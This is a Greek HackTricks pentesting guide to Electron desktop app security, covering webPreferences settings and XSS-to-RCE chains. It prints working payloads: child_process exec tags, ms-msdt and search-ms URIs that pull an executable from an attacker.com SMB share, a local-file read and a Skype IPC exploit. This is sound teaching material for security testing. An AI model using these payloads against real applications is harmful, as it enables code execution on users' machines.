# Εφαρμογές desktop Electron

{{#include ../../banners/hacktricks-training.md}}

## Εισαγωγή

Το Electron συνδυάζει μια προνομιούχα κύρια διεργασία **Node.js** με διεργασίες renderer του **Chromium**. Το Electron δεν είναι web browser: ο κώδικας της εφαρμογής μπορεί σκόπιμα να εκθέτει δυνατότητες όπως πρόσβαση στο filesystem και στο shell, επομένως η φόρτωση μη έμπιστου περιεχομένου απαιτεί αυστηρότερο σχεδιασμό ορίων από ό,τι ένας συνηθισμένος ιστότοπος.<sup>[[21]](#references)</sup>

Ο κώδικας εφαρμογών Electron συσκευάζεται συνήθως σε ένα αρχείο `.asar`. Αποσυμπιέστε το πριν εξετάσετε τον πηγαίο κώδικα:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

Το `package.json` της εφαρμογής προσδιορίζει το κύριο σημείο εισόδου της. Αυτό το αρχείο συνήθως δημιουργεί παράθυρα renderer και ορίζει τις ευαίσθητες από άποψη ασφάλειας επιλογές `webPreferences`.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Το Electron έχει δύο κύριους τύπους διεργασιών:

- Main Process (έχει πλήρη πρόσβαση στο NodeJS)
- Renderer Process (θα πρέπει να έχει περιορισμένη πρόσβαση στο NodeJS για λόγους ασφαλείας)

![Εφαρμογές Electron για υπολογιστές - Εισαγωγή: Renderer Process (θα πρέπει να έχει περιορισμένη πρόσβαση στο NodeJS για λόγους ασφαλείας)](<../../images/image (182).png>)

Μια **renderer process** θα είναι ένα παράθυρο προγράμματος περιήγησης που φορτώνει ένα αρχείο:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

Η **main process** διαμορφώνει κάθε διεργασία renderer, συνήθως κατά τη δημιουργία ενός `BrowserWindow`. Οι ασφαλείς ρυθμίσεις μειώνουν την πιθανότητα η παραβίαση του renderer να οδηγήσει σε εκτέλεση εγγενούς κώδικα, αλλά δεν καθιστούν εγγενώς ασφαλές το μη έμπιστο περιεχόμενο.<sup>[[21]](#references)[[22]](#references)</sup>

Ελέγξτε τουλάχιστον αυτές τις προτιμήσεις του renderer:<sup>[[22]](#references)</sup>

- **`nodeIntegration`** είναι `false` από προεπιλογή. Αν ενεργοποιηθεί, παρέχει στην JavaScript του renderer πρόσβαση στα API του Node.js και απενεργοποιεί επίσης το sandbox αυτού του renderer.
- **`contextIsolation`** είναι `true` από προεπιλογή. Διαχωρίζει το πλαίσιο JavaScript της σελίδας από το πλαίσιο που χρησιμοποιούν τα preload scripts και τα εσωτερικά στοιχεία του Electron.
- **`preload`** δεν έχει προεπιλεγμένη διαδρομή. Ένα ρυθμισμένο preload script εκτελείται πριν από τα scripts της σελίδας και μπορεί να εκθέσει API περιορισμένου εύρους μέσω του `contextBridge`.
- **`sandbox`** είναι `true` από προεπιλογή από το Electron 20. Περιορίζει την πρόσβαση του renderer στους πόρους του λειτουργικού συστήματος· η ρύθμιση `nodeIntegration: true` το απενεργοποιεί.
- **`nodeIntegrationInWorker`** είναι `false` από προεπιλογή και ελέγχει την ενσωμάτωση του Node.js στα Web Workers.
- **`nodeIntegrationInSubFrames`** είναι `false` από προεπιλογή.
  - Αν το **`nodeIntegration`** είναι **ενεργοποιημένο**, αυτό θα επιτρέπει τη χρήση **API του Node.js** σε ιστοσελίδες που **φορτώνονται σε iframe** μέσα σε μια εφαρμογή Electron.
  - Αν το **`nodeIntegration`** είναι **απενεργοποιημένο**, τότε τα preload scripts θα φορτώνονται στο iframe

Παράδειγμα διαμόρφωσης:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

Μερικά **RCE payloads** από [εδώ](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### Καταγραφή κίνησης

Τροποποιήστε τη διαμόρφωση start-main και προσθέστε τη χρήση ενός proxy, όπως:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## Στατική ιχνηλάτηση ορίου από ASAR προς native με REA

Το **REA** μπορεί να διαβάσει ένα ASAR ή έναν εξαγμένο κατάλογο εφαρμογής χωρίς να εκτελέσει το JavaScript bootstrap του. Το γράφημα της εφαρμογής καταγράφει σημεία εισόδου πακέτων, bundled modules, ρυθμίσεις `BrowserWindow` και preload, μέλη του `contextBridge`, εγγραφές IPC, αιτήματα για native add-ons και ταυτότητες source maps. Αυτό προσφέρει ένα σημείο εκκίνησης για την ιχνηλάτηση μιας δυνατότητας που εκτίθεται στον renderer έως έναν handler με αυξημένα δικαιώματα στη main process.<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

Για ένα κυριολεκτικό feature string, περάστε το πλήρες Evidence record ως `application` και αντικαταστήστε το seed με ένα που παρατηρήθηκε στον στόχο:<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

Η ίδια ροή εργασίας `trace_application_feature` δέχεται επίσης ως seed ένα παρατηρημένο literal API member, IPC channel ή module. Ελέγξτε τη διαδρομή του handler, τους υποψηφίους επικύρωσης και τη μεταβίβαση στο native code σε σχέση με τις τοποθεσίες πηγαίου κώδικα που επιστράφηκαν. Ένα renderer `invoke` αντιστοιχεί μόνο σε έναν μοναδικό υποψήφιο `ipcMain.handle`/`handleOnce` στο ίδιο ακριβώς literal channel· αντίστοιχα, το `send` απαιτεί έναν μοναδικό υποψήφιο `ipcMain.on`/`once`/`addListener`. Οι δυναμικοί ή διπλοί handlers παραμένουν ανεπίλυτοι. Ένα ζητούμενο member `.node` δεν αποτελεί επαληθευμένο native export· τα αντίστοιχα Hopper/Ghidra Evidence πρέπει να έχουν το ίδιο artifact digest προτού καταλήξετε σε αυτό το συμπέρασμα. Η στατική προσπελασιμότητα επίσης δεν αποδεικνύει ότι η διαδρομή εκτελέστηκε.<sup>[[24]](#references)[[25]](#references)</sup>

Για το όριο εμπιστοσύνης renderer-to-main και την επικύρωση handler, δείτε το [RCE στο Electron contextIsolation μέσω IPC](electron-contextisolation-rce-via-ipc.md).

Για native έρευνα συνέχειας με βάση provider, δείτε τα [Εργαλεία αντιστροφής και βασικές μέθοδοι](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea).

## Επιφάνεια επίθεσης αυτόματης ενημέρωσης του Electron

Για την ακεραιότητα των release feed, το rollback, τη σύγχυση υπογεγραμμένων channel και το TOCTOU σε staging file, δείτε τα [Όρια εμπιστοσύνης της αυτόματης ενημέρωσης του Electron](electron-auto-update-trust-boundaries.md).

## Τοπική εισαγωγή κώδικα στο Electron

Αν έχετε πρόσβαση εγγραφής ή instrumentation σε εγκατεστημένη εφαρμογή, δείτε την [Τοπική εισαγωγή κώδικα στο Electron και η παραποίηση snapshot](electron-local-code-injection-and-snapshot-tampering.md) για διαδρομές ASAR/main-process και V8 snapshot, καθώς και τους συνδέσμους για κάθε λειτουργικό σύστημα.

## RCE: XSS + nodeIntegration

Αν το **nodeIntegration** έχει οριστεί σε **on**, η JavaScript μιας ιστοσελίδας μπορεί να χρησιμοποιήσει εύκολα λειτουργίες του Node.js, απλώς καλώντας το `require()`. Για παράδειγμα, ο τρόπος εκτέλεσης της εφαρμογής calc στα Windows είναι:

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Το script που υποδεικνύεται σε αυτήν τη ρύθμιση **φορτώνεται πριν από άλλα scripts στον renderer**, επομένως έχει **απεριόριστη πρόσβαση στα Node APIs**:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Επομένως, το script μπορεί να εξαγάγει node-features σε σελίδες:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **Αν το `contextIsolation` είναι ενεργό, αυτό δεν θα λειτουργήσει**

## RCE: XSS + contextIsolation

Το _**contextIsolation**_ εισάγει **διαχωρισμένα contexts μεταξύ των scripts της ιστοσελίδας και του εσωτερικού JavaScript κώδικα του Electron**, ώστε η εκτέλεση JavaScript κάθε κώδικα να μην επηρεάζει τον άλλο. Πρόκειται για απαραίτητη δυνατότητα για την εξάλειψη της πιθανότητας RCE.

Αν τα contexts δεν είναι απομονωμένα, ένας attacker μπορεί να:

1. Εκτελέσει **αυθαίρετο JavaScript στο renderer** (XSS ή πλοήγηση σε εξωτερικούς ιστότοπους)
2. **Αντικαταστήσει την ενσωματωμένη μέθοδο** που χρησιμοποιείται στον preload ή στον εσωτερικό κώδικα του Electron με δική του συνάρτηση
3. **Προκαλέσει** τη χρήση της **αντικατασταθείσας συνάρτησης**
4. RCE;

Υπάρχουν 2 σημεία όπου μπορούν να αντικατασταθούν ενσωματωμένες μέθοδοι: στον κώδικα preload ή στον εσωτερικό κώδικα του Electron:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Παράκαμψη συμβάντος κλικ

Αν υπάρχουν περιορισμοί όταν κάνετε κλικ σε έναν σύνδεσμο, ίσως μπορέσετε να τους παρακάμψετε **κάνοντας μεσαίο κλικ** αντί για κανονικό αριστερό κλικ.

```javascript
window.addEventListener('click', (e) => {
```

## RCE μέσω shell.openExternal

Για περισσότερες πληροφορίες σχετικά με αυτά τα παραδείγματα, δείτε τα [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) και [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

Κατά την ανάπτυξη μιας εφαρμογής Electron για υπολογιστές, είναι κρίσιμο να διασφαλίζεται ότι οι ρυθμίσεις για τα `nodeIntegration` και `contextIsolation` είναι σωστές. Έχει διαπιστωθεί ότι αυτές οι ρυθμίσεις αποτρέπουν αποτελεσματικά την **εκτέλεση απομακρυσμένου κώδικα (RCE) στην πλευρά του πελάτη**, με στόχο τα preload scripts ή τον εγγενή κώδικα του Electron από την κύρια διεργασία.

Όταν ένας χρήστης αλληλεπιδρά με συνδέσμους ή ανοίγει νέα παράθυρα, ενεργοποιούνται συγκεκριμένοι event listeners, οι οποίοι είναι κρίσιμοι για την ασφάλεια και τη λειτουργικότητα της εφαρμογής:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

Αυτοί οι listeners **παρακάμπτονται από την εφαρμογή desktop** για την υλοποίηση της δικής της **επιχειρησιακής λογικής**. Η εφαρμογή αξιολογεί αν ένας σύνδεσμος στον οποίο γίνεται πλοήγηση πρέπει να ανοίξει εσωτερικά ή σε εξωτερικό web browser. Αυτή η απόφαση λαμβάνεται συνήθως μέσω μιας συνάρτησης, της `openInternally`. Αν αυτή η συνάρτηση επιστρέψει `false`, αυτό υποδεικνύει ότι ο σύνδεσμος πρέπει να ανοίξει εξωτερικά, χρησιμοποιώντας τη συνάρτηση `shell.openExternal`.

**Ακολουθεί απλοποιημένος ψευδοκώδικας:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Οι βέλτιστες πρακτικές ασφαλείας του Electron JS συνιστούν να μην περνάει μη έμπιστο περιεχόμενο στη συνάρτηση `openExternal`, καθώς αυτό θα μπορούσε να οδηγήσει σε RCE μέσω διαφόρων πρωτοκόλλων. Τα λειτουργικά συστήματα υποστηρίζουν διαφορετικά πρωτόκολλα που ενδέχεται να προκαλέσουν RCE. Για λεπτομερή παραδείγματα και περαιτέρω επεξήγηση αυτού του θέματος, μπορείτε να ανατρέξετε σε [αυτή την πηγή](https://positive.security/blog/url-open-rce#windows-10-19042), η οποία περιλαμβάνει παραδείγματα πρωτοκόλλων των Windows που μπορούν να αξιοποιήσουν αυτήν την ευπάθεια.<sup>[[10]](#references)</sup>

Στο macOS, η συνάρτηση `openExternal` μπορεί να αξιοποιηθεί για την εκτέλεση αυθαίρετων εντολών, όπως στο `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Παραδείγματα exploits με πρωτόκολλα των Windows περιλαμβάνουν:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + ευάλωτο preload IPC + shell.openExternal

Αυτή η ευπάθεια εντοπίζεται στην **[αναφορά αυτή](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.<sup>[[11]](#references)</sup>

Το **webviewTag** είναι ένα **παρωχημένο χαρακτηριστικό** που επιτρέπει τη χρήση του **NodeJS** στο **renderer process**. Θα πρέπει να είναι απενεργοποιημένο, καθώς επιτρέπει τη φόρτωση ενός script μέσα στο preload context, όπως:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

Επομένως, ένας επιτιθέμενος που καταφέρνει να φορτώσει μια αυθαίρετη σελίδα θα μπορούσε να χρησιμοποιήσει αυτό το tag για να **φορτώσει ένα αυθαίρετο preload script**.

Στη συνέχεια, έγινε κατάχρηση αυτού του preload script για να κληθεί μια **ευάλωτη υπηρεσία IPC (`skype-new-window`)**, η οποία καλούσε το **`shell.openExternal`** για να επιτευχθεί RCE:

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## Ανάγνωση εσωτερικών αρχείων: XSS + contextIsolation

**Η απενεργοποίηση του `contextIsolation` επιτρέπει τη χρήση ετικετών `<webview>`**, παρόμοιων με τις `<iframe>`, για την ανάγνωση και εξαγωγή τοπικών αρχείων. Ένα παρεχόμενο παράδειγμα δείχνει πώς να εκμεταλλευτείτε αυτήν την ευπάθεια για να διαβάσετε τα περιεχόμενα εσωτερικών αρχείων:<sup>[[2]](#references)</sup>

![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - Ανάγνωση εσωτερικών αρχείων: XSS + contextIsolation: Η απενεργοποίηση του contextIsolation επιτρέπει τη χρήση ετικετών , παρόμοιων με , για...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Επιπλέον, παρουσιάζεται μια άλλη μέθοδος για **την ανάγνωση ενός εσωτερικού αρχείου**, η οποία αναδεικνύει μια κρίσιμη ευπάθεια ανάγνωσης τοπικών αρχείων σε μια desktop εφαρμογή Electron. Περιλαμβάνει την εισαγωγή ενός script για την εκμετάλλευση της εφαρμογής και την εξαγωγή δεδομένων:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + Old Chromium**

Αν η έκδοση του **Chromium** που περιλαμβάνεται στην εφαρμογή είναι παλιά και έχει γνωστές ευπάθειες, ίσως είναι δυνατό να γίνει exploit και να μετατραπεί το XSS σε RCE.<sup>[[20]](#references)</sup>\
Μπορείτε να δείτε ένα παράδειγμα σε αυτό το **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **XSS Phishing μέσω παράκαμψης regex εσωτερικού URL**

Αν εντοπίσετε XSS αλλά **δεν μπορείτε να προκαλέσετε RCE ή να κλέψετε εσωτερικά αρχεία**, μπορείτε και πάλι να δοκιμάσετε να **κλέψετε διαπιστευτήρια μέσω phishing**.<sup>[[1]](#references)</sup>

Αρχικά, εξετάστε τον κώδικα του frontend για να προσδιορίσετε τι συμβαίνει όταν ανοίγει ένα νέο URL:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

Η κλήση της **`openInternally`** καθορίζει αν ένας σύνδεσμος της πλατφόρμας ανοίγει στο **παράθυρο της desktop εφαρμογής** ή αν ένας πόρος τρίτου μέρους ανοίγει στο πρόγραμμα περιήγησης του συστήματος.

Αν είναι δυνατή η παράκαμψη του regex allowlist URL της συνάρτησης —για παράδειγμα, επειδή οι τελείες σε ένα hostname δεν είχαν γίνει escape— ένας attacker θα μπορούσε να εκμεταλλευτεί το XSS για να εμφανίσει ένα πειστικό prompt διαπιστευτηρίων σε υποδομή που ελέγχει:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## Πρωτόκολλο `file://`

Όπως αναφέρεται [στον οδηγό ασφαλείας του Electron](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), οι σελίδες που εκτελούνται μέσω **`file://`** έχουν ευρεία πρόσβαση σε αρχεία. Κατά συνέπεια, το **XSS μπορεί να χρησιμοποιηθεί για τη φόρτωση αυθαίρετων αρχείων** από τον υπολογιστή του χρήστη. Ένα σωστά σχεδιασμένο **προσαρμοσμένο πρωτόκολλο** μπορεί να περιορίσει την πρόσβαση σε ένα συγκεκριμένο σύνολο αρχείων.<sup>[[21]](#references)</sup>

Για μια διαφορετική παράκαμψη του πεδίου εφαρμογής αρχείων σε περιβάλλον worker σε προεπισκοπήσεις desktop assistant, δείτε [AI assistant embedded browser trust boundaries](../../AI/AI-Embedded-Browser-Trust-Boundaries.md#worker-context-bypass-of-a-local-previews-file-scope).

## Ενότητα Remote

Η ενότητα Electron Remote επιτρέπει στις **renderer processes να έχουν πρόσβαση σε API της main process**, διευκολύνοντας την επικοινωνία μέσα σε μια εφαρμογή Electron. Ωστόσο, η ενεργοποίηση αυτής της ενότητας εισάγει σημαντικούς κινδύνους ασφαλείας. Διευρύνει την επιφάνεια επίθεσης της εφαρμογής, καθιστώντας την πιο ευάλωτη σε αδυναμίες όπως επιθέσεις cross-site scripting (XSS).

> [!TIP]
> Παρόλο που η ενότητα **remote** εκθέτει ορισμένα API από τη main process στις renderer processes, δεν είναι εύκολο να επιτευχθεί RCE απλώς με την κατάχρηση των components. Ωστόσο, τα components ενδέχεται να εκθέτουν ευαίσθητες πληροφορίες.

> [!WARNING]
> Πολλές εφαρμογές που εξακολουθούν να χρησιμοποιούν την ενότητα remote το κάνουν με τρόπο που **απαιτεί να είναι ενεργοποιημένο το NodeIntegration** στη renderer process, κάτι που αποτελεί **τεράστιο κίνδυνο ασφαλείας**.

Η ενσωματωμένη ενότητα `remote` του Electron καταργήθηκε πρώτα ως deprecated και έπειτα αφαιρέθηκε. Οι εφαρμογές που εξακολουθούν να χρειάζονται αυτό το μοντέλο μπορούν να χρησιμοποιήσουν το ξεχωριστό πακέτο `@electron/remote`. Λόγω των επιπτώσεων στην ασφάλεια και την απόδοση, αποφύγετε την έκθεση δυνατοτήτων τύπου remote σε μη έμπιστες renderer processes.

Με το `@electron/remote`, πρέπει πρώτα να γίνει **αρχικοποίηση στη main process**:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

Η διεργασία renderer μπορεί στη συνέχεια να εισαγάγει αντικείμενα από το module:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

Το **[blog post](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** παρουσιάζει ορισμένες ενδιαφέρουσες **functions** που εκτίθενται από το αντικείμενο **`app`** του remote module:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - **Επανεκκινεί** την εφαρμογή, **τερματίζοντας** την τρέχουσα παρουσία και **εκκινώντας** μια νέα. Χρήσιμο για **ενημερώσεις εφαρμογών** ή σημαντικές **αλλαγές κατάστασης**.
- **`app.setAppLogsPath([path])`**  
   - **Ορίζει** ή **δημιουργεί** έναν κατάλογο για την αποθήκευση των **app logs**. Τα logs μπορούν να **ανακτηθούν** ή να **τροποποιηθούν** με τη χρήση των **`app.getPath()`** ή **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - **Καταχωρίζει** το τρέχον εκτελέσιμο ως τον **προεπιλεγμένο χειριστή** για ένα καθορισμένο **protocol**. Μπορείτε να ορίσετε μια **προσαρμοσμένη διαδρομή** και **arguments**, αν χρειάζεται.
- **`app.setUserTasks(tasks)`**  
   - **Προσθέτει** εργασίες στην **κατηγορία Tasks** του **Jump List** (στα Windows). Κάθε εργασία μπορεί να καθορίζει πώς **εκκινείται** η εφαρμογή ή ποια **arguments** μεταβιβάζονται.
- **`app.importCertificate(options, callback)`**  
   - **Εισάγει** ένα **PKCS#12 certificate** στο **certificate store** του συστήματος (μόνο σε Linux). Μπορεί να χρησιμοποιηθεί ένα **callback** για τη διαχείριση του αποτελέσματος.
- **`app.moveToApplicationsFolder([options])`**  
   - **Μετακινεί** την εφαρμογή στον φάκελο **Applications** (σε macOS). Βοηθά στη διασφάλιση μιας **τυπικής εγκατάστασης** για τους χρήστες Mac.
- **`app.setJumpList(categories)`**  
   - **Ορίζει** ή **αφαιρεί** ένα **προσαρμοσμένο Jump List** στα **Windows**. Μπορείτε να καθορίσετε **κατηγορίες** για την οργάνωση της εμφάνισης των εργασιών στον χρήστη.
- **`app.setLoginItemSettings(settings)`**  
   - **Ρυθμίζει** ποια **εκτελέσιμα** ξεκινούν κατά τη **σύνδεση**, μαζί με τις **options** τους (μόνο σε macOS και Windows).
  
Παράδειγμα:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## module systemPreferences

Το **κύριο API** για την πρόσβαση στις προτιμήσεις συστήματος και την **εκπομπή συμβάντων συστήματος** στο Electron. Μέθοδοι όπως οι **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** και **setUserDefault** αποτελούν όλες **μέρος** αυτού του module.

**Παράδειγμα χρήσης:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **Ακούει** για **native ειδοποιήσεις macOS** χρησιμοποιώντας το NSDistributedNotificationCenter.  
* Πριν από το **macOS Catalina**, μπορούσατε να παρακολουθείτε **όλες** τις κατανεμημένες ειδοποιήσεις περνώντας **nil** στο CFNotificationCenterAddObserver.  
* Μετά τα **Catalina / Big Sur**, οι εφαρμογές σε sandbox μπορούν ακόμα να **εγγραφούν** σε **πολλά συμβάντα** (για παράδειγμα, **κλειδώματα/ξεκλειδώματα οθόνης**, **προσαρτήσεις τόμων**, **δραστηριότητα δικτύου** κ.λπ.) καταχωρίζοντας ειδοποιήσεις **με βάση το όνομα**.

### **getUserDefault / setUserDefault**

* **Διασυνδέεται** με το **NSUserDefaults**, το οποίο αποθηκεύει προτιμήσεις **εφαρμογής** ή **καθολικές** προτιμήσεις στο macOS.
    
* Το **getUserDefault** μπορεί να **ανακτήσει** ευαίσθητες πληροφορίες, όπως **τοποθεσίες πρόσφατων αρχείων** ή **τη γεωγραφική τοποθεσία του χρήστη**.
    
* Το **setUserDefault** μπορεί να **τροποποιήσει** αυτές τις προτιμήσεις, επηρεάζοντας ενδεχομένως τη **διαμόρφωση** μιας εφαρμογής.
    
* Σε **παλαιότερες εκδόσεις του Electron** (πριν από την v8.3.0), ήταν **προσβάσιμη** μόνο η **standard suite** του NSUserDefaults.

## Shell.showItemInFolder

Αυτή η συνάρτηση εμφανίζει το δοσμένο αρχείο σε έναν διαχειριστή αρχείων. Στις επηρεαζόμενες πλατφόρμες και εκδόσεις, αυτή η ενέργεια **μπορούσε να εκτελέσει αυτόματα το αρχείο**.

Για περισσότερες πληροφορίες, δείτε [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Content Security Policy

Οι εφαρμογές Electron θα πρέπει να έχουν **Content Security Policy (CSP)** για να **αποτρέπουν επιθέσεις XSS**. Το **CSP** είναι ένα **πρότυπο ασφαλείας** που βοηθά στην **αποτροπή** της **εκτέλεσης** **μη έμπιστου κώδικα** στο πρόγραμμα περιήγησης.

Συνήθως **διαμορφώνεται** στο αρχείο **`main.js`** ή στο πρότυπο **`index.html`**, με το CSP μέσα σε μια **ετικέτα meta**.

Για περισσότερες πληροφορίες, δείτε:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: Webview CSP + εμπιστοσύνη postMessage + φόρτωση τοπικών αρχείων (VS Code 1.63)

Αυτή η αλυσίδα επιθέσεων στον πραγματικό κόσμο επηρέασε το Visual Studio Code 1.63 (CVE-2021-43908) και δείχνει πώς ένα XSS που βασίζεται σε markdown μέσα σε webview μπορεί να κλιμακωθεί σε πλήρες RCE όταν τα CSP, postMessage και οι handlers σχημάτων URI έχουν εσφαλμένη διαμόρφωση. Δημόσιο PoC: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Επισκόπηση αλυσίδας επιθέσεων
- Αρχικό XSS μέσω CSP του webview: Το CSP που δημιουργήθηκε περιλάμβανε `style-src 'self' 'unsafe-inline'`, επιτρέποντας injection μέσω inline/style σε περιβάλλον `vscode-webview://`. Το payload έστελνε beacon στο `/stealID` για να υποκλέψει το extensionId του webview-στόχου.
- Δημιουργία URL webview-στόχου: Χρήση του leaked ID για τη δημιουργία του `vscode-webview://<extensionId>/.../<publicUrl>`.
- Δεύτερο XSS μέσω εμπιστοσύνης στο postMessage: Το εξωτερικό webview εμπιστευόταν το `window.postMessage` χωρίς αυστηρούς ελέγχους origin/type και φόρτωνε HTML του επιτιθέμενου με `allowScripts: true`.
- Φόρτωση τοπικού αρχείου μέσω επανεγγραφής σχήματος/διαδρομής: Το payload επανέγραφε το `file:///...` σε `vscode-file://vscode-app/...` και αντικαθιστούσε το `exploit.md` με το `RCE.html`, καταχρώμενο την αδύναμη επικύρωση διαδρομής για να φορτώσει έναν προνομιούχο τοπικό πόρο.
- RCE σε περιβάλλον με ενεργοποιημένο Node: Το φορτωμένο HTML εκτελούνταν με διαθέσιμα τα Node APIs, επιτρέποντας την εκτέλεση εντολών του λειτουργικού συστήματος.

Παράδειγμα primitive RCE στο τελικό περιβάλλον
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

